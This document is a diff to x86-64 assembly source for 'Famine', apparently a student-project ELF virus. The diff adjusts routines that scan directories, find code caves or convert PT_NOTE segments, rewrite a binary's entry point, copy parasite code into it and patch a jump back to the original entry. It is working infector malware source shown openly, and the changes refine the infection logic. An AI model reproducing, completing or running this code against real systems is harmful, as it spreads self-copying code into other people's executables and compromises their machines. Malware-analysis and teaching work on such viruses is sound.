@@ -80,10 +80,6 @@ _readDir:
             mov rdi, FAM(famine.pwdPtr)
             call _strcpy
 
-            ; ;debug
-            ; writeWork
-            ; writeBack
-
 			_bf_chk_file:
 			call _check_file
 
@@ -165,8 +161,6 @@ _check_file:
 		_go_to_last_segment_end:
 		mov	INF(infection.last_seg_hdr_addr), r14
 		xor r9, r9
-		; xor rcx, rcx
-		; mov cx, [r15  + elf64_ehdr.e_phnum]
 		_segment_loop:
 			cmp cx, 0
 			jle	_segment_loop_end
@@ -221,10 +215,10 @@ _check_file:
 				add r9, elf64_phdr.p_offset
 				cmp [r9], r8
 				setb INF(infection.add_page)			; if ([r9] < r8) { infection.add_page = 1) }
-				; jl _continue							; if (infection end's offset > next segment offset) continue segment loop
 
 			_save_offsets:
 			; r8	-> infection structure members
+			; r9	== injection address
 			; r12	== original entrypoint
 			;*r13	== segment end's offset (_check_cave_size)
 			;*r14	-> segment header in header table
@@ -235,8 +229,12 @@ _check_file:
 				mov [r8], r12
 				lea r8, INF(infection.injection_offset)
 				mov [r8], r13
-				;add qword [r8], 0x10
-				;and qword [r8], -16							; align
+				;lea	r8, INF(infection.injection_addr)
+				;push r9
+				;mov r9, [r14 + elf64_phdr.p_vaddr]
+				;add r9, [r14 + elf64_phdr.p_memsz]
+				;mov [r8], r9
+				;pop r9
 				lea r8, INF(infection.seg_hdr_addr)
 				mov [r8], r14
 				jmp _continue
@@ -275,9 +273,6 @@ _add_page:
 		lea r8, INF(infection.map_addr)
 		mov [r8], rax
 
-	;mov rdi, PAGE_SIZE
-	;call _update_seg_sizes
-
 	_find_memory_eof:
 		mov r14, INF(infection.map_addr)
 		movzx rax, word [r14 + elf64_ehdr.e_shnum]
@@ -312,7 +307,6 @@ _add_page:
 			cmp rcx, rax
 			jge _find_pt_note_loop_end
 			cmp dword [r14 + elf64_phdr.p_type], PT_NOTE
-			;je _find_sht_note
 			je _mutate_pt_note_seg
 			
 		_find_pt_note_loop_continue:
@@ -352,9 +346,8 @@ _infection:
 	; r10	== injection offset
 		mov r8, INF(infection.map_addr)
 		add r8, elf64_ehdr.e_entry
-		;mov r10, INF(infection.injection_offset)
-		mov [r8], rax
-	
+		mov r10, INF(infection.injection_addr)
+		mov [r8], r10
 		cmp byte INF(infection.add_page), 0
 		jg _copy_parasite
 		mov rdi, CODE_LEN
@@ -381,7 +374,6 @@ _infection:
 		mov r10, INF(infection.injection_addr)
 		add r10, FINJMP_OFF
 		add r10, 0x05
-		;mov r9, INF(infection.map_addr)
 		mov r9, INF(infection.original_entry)
 		sub r9, r10
 		mov [r8], r9d
@@ -396,16 +388,16 @@ _update_seg_sizes:
 
 	; * Update file size *
 	add r8, qword elf64_phdr.p_filesz
-	add qword [r8], 0x10
-	and qword [r8], -16								; align before parasite code
-	add qword [r8], rdi								; add length of parasite code
+	;add qword [r8], 0x10
+	;and qword [r8], -16								; align before parasite code
+	add qword [r8], rdi
 	pop r8
 
 	; * Update memory size *
 	add r8, elf64_phdr.p_memsz
-	add qword [r8], 0x10
-	and qword [r8], -16								; align before parasite code
-	add qword [r8], rdi						; add length of parasite code
+	;add qword [r8], 0x10
+	;and qword [r8], -16								; align before parasite code
+	add qword [r8], rdi
 	
 	ret
 
@@ -470,13 +462,6 @@ _strlen:
 	ft_strlen_end:
 		mov rax, rcx
 		ret
-
-;dir1        db  "/tmp/test", 0
-;dir1Len    equ $ - dir1
-;dir2        db  "/tmp/test2", 0
-;dir2Len    equ $ - dir2
-;signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
-;signature_len equ $ - signature
 
 	nop
 	nop
